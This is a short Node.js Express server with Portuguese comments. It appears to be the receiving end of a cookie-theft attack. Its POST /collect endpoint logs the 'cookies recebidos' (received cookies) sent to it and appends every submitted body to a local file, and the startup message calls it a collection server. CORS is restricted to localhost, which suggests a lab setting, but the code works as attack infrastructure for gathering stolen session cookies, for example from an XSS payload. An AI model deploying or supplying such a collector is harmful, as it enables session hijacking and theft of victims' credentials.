const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');

const app = express();
app.use(bodyParser.json());

// Configure o CORS para permitir requisições da origem específica
app.use(cors({ origin: 'http://localhost' }));

app.post('/collect', (req, res) => {
    console.log('Cookies recebidos:', req.body.cookies);

    const dataToSave = JSON.stringify(req.body) + '\n';

    fs.appendFile('dados.txt', dataToSave, (err) => {
        if (err) {
            console.error('Erro ao salvar os dados:', err);
            res.sendStatus(500);
        } else {
            console.log('Dados salvos com sucesso.');
            res.sendStatus(200);
        }
    });
});

app.listen(4000, () => console.log('Servidor de coleta rodando na porta 4000'));
